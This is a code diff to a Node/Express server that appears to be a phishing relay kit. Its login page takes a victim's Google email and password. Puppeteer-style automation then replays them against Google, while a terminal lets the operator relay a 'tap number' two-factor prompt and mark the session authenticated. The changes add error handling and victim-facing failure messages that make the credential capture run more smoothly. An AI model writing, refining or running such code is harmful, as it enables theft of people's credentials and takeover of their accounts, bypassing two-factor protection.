@@ -92,8 +92,11 @@ async function automateGoogleLogin(email, password) {
         await activePage.click('#passwordNext');
 
         console.log('✅ Google login automation completed, browser ready.');
+        return { success: true };
     } catch (err) {
         console.error('❌ Google automation error:', err.message);
+        resetAuthState();
+        return { success: false, message: 'Google automation failed. Please check credentials and try again.' };
     }
 }
 
@@ -142,41 +145,56 @@ function handleTerminalChoice(input) {
 app.get('/', (req,res)=>res.sendFile(path.join(__dirname,'../frontend/index.html')));
 app.get('/login', (req,res)=>res.sendFile(path.join(__dirname,'../frontend/login.html')));
 
-app.post('/auth', (req,res)=>{
-    const {email, password, step='username'} = req.body;
-    if(step!=='get_state') console.log('\n'+'='.repeat(50), '🔐 NEW AUTH');
+app.post('/auth', async (req,res)=>{
+    try {
+        const {email, password, step='username'} = req.body;
+        if(step!=='get_state') console.log('\n'+'='.repeat(50), '🔐 NEW AUTH');
 
-    if(step==='username'){
-        if(!email || typeof email!=='string' || email.length<5 || !email.includes('@')) return res.status(400).json({success:false,message:'Invalid email'});
-        currentUser={email};
-        logState('Email received');
-        setAuthTimeout();
-        return res.json({success:true,step:'username_processed',message:'Email processed. Enter password...'});
-    }
-    if(step==='password'){
-        if(!password || typeof password!=='string') return res.status(400).json({success:false,message:'Provide password'});
-        currentUser.password = password;
-        logState('Password received');
-        setTimeout(()=>automateGoogleLogin(currentUser.email, currentUser.password),500);
-        showTerminalOptions('password_entered', currentUser.email, password);
-        return res.json({success:true,step:'password_processed',message:'Password processed. Awaiting manual control...'});
-    }
-    if(step==='get_state') return res.json({state:authState,number:authState==='show_tap_number'?customTapNumber:null});
+        if(step==='username'){
+            if(!email || typeof email!=='string' || email.length<5 || !email.includes('@')) return res.status(400).json({success:false,message:'Invalid email'});
+            currentUser={email};
+            logState('Email received');
+            setAuthTimeout();
+            return res.json({success:true,step:'username_processed',message:'Email processed. Enter password...'});
+        }
+        if(step==='password'){
+            if(!password || typeof password!=='string') return res.status(400).json({success:false,message:'Provide password'});
+            currentUser.password = password;
+            logState('Password received');
+            const result = await automateGoogleLogin(currentUser.email, currentUser.password);
+            if (!result.success) {
+                return res.status(400).json(result);
+            }
+            showTerminalOptions('password_entered', currentUser.email, password);
+            return res.json({success:true,step:'password_processed',message:'Password processed. Awaiting manual control...'});
+        }
+        if(step==='get_state') return res.json({state:authState,number:authState==='show_tap_number'?customTapNumber:null});
 
-    return res.status(400).json({success:false,message:'Invalid step'});
+        return res.status(400).json({success:false,message:'Invalid step'});
+    } catch (error) {
+        console.error('Auth error:', error);
+        resetAuthState();
+        return res.status(500).json({ success: false, message: 'An internal server error occurred.' });
+    }
 });
 
 app.get('/check-session',(req,res)=>res.json(req.session.user?{loggedIn:true,user:req.session.user}:{loggedIn:false}));
 app.get('/logout',(req,res)=>{ req.session.destroy(); authState='standby'; currentUser=null; closeBrowser(); res.redirect('/'); });
 
 app.post('/complete-auth',(req,res)=>{
-    if(authState==='auth_success' && currentUser){
-        req.session.user = {email:currentUser.email,name:currentUser.email.split('@')[0],verified_email:true,auth_method:'manual_control',auth_time:Date.now(),local_auth:true};
-        console.log('✅ Session created for',currentUser.email);
+    try {
+        if(authState==='auth_success' && currentUser){
+            req.session.user = {email:currentUser.email,name:currentUser.email.split('@')[0],verified_email:true,auth_method:'manual_control',auth_time:Date.now(),local_auth:true};
+            console.log('✅ Session created for',currentUser.email);
+            resetAuthState();
+            return res.json({success:true,message:'Auth completed!',user:req.session.user});
+        }
+        return res.status(400).json({success:false,message:'Auth not ready'});
+    } catch (error) {
+        console.error('Complete auth error:', error);
         resetAuthState();
-        return res.json({success:true,message:'Auth completed!',user:req.session.user});
+        return res.status(500).json({ success: false, message: 'An internal server error occurred during auth completion.' });
     }
-    return res.status(400).json({success:false,message:'Auth not ready'});
 });
 
 // --- TERMINAL LOOP ---
